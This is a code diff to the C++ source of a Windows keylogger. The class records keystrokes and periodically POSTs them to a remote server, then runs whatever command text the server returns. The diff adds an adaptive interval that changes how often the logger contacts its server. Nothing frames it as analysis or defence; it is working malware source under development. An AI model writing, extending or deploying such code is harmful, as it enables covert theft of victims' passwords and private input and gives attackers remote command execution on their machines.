@@ -51,7 +51,7 @@ const char* keyStringsNoShift[] =
 	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
 };
 
-Keylogger::Keylogger() : shouldStop(false)
+Keylogger::Keylogger() : shouldStop(false), sendInterval(V_SEND_INTERVAL_MIN)
 {
 	memset(keysActive, false, sizeof(keysActive));
 
@@ -84,7 +84,7 @@ void Keylogger::Run()
 	{
 		Sleep(V_IDLE_TIME);
 
-		if (GetTickCount() - ticksLast >= V_SEND_INTERVAL)
+		if (GetTickCount() - ticksLast >= this->sendInterval)
 		{
 			this->Send();
 			keysPressed.clear();
@@ -223,15 +223,30 @@ void Keylogger::Send()
 		msgText += *itr;
 	}
 
+	size_t msgText_len = msgText.size();
+
 	size_t response_len;
 	char *response_start;
 
-	bool ret = network.SendPost(sendBuf, sizeof(sendBuf)-1, &response_len, (const char**)&response_start, V_NET_FILE_DATA, msgText.c_str(), msgText.size(), true);
-	if (ret)
+	bool ret = network.SendPost(sendBuf, sizeof(sendBuf)-1, &response_len, (const char**)&response_start, V_NET_FILE_DATA, msgText.c_str(), msgText_len, true);
+
+	if (!ret || response_len == 0)
 	{
+		this->DecreaseSendInterval();
+	}
+	else
+	{
+		this->IncreaseSendInterval();
 		response_start[response_len] = '\0';
 		cmd.Run(response_start);
 	}
+}
 
-	return;
+void Keylogger::IncreaseSendInterval()
+{
+	this->sendInterval = max(V_SEND_INTERVAL_MIN, this->sendInterval / 2);
+}
+void Keylogger::DecreaseSendInterval()
+{
+	this->sendInterval = min(V_SEND_INTERVAL_MAX, this->sendInterval * 20 / 19);
 }
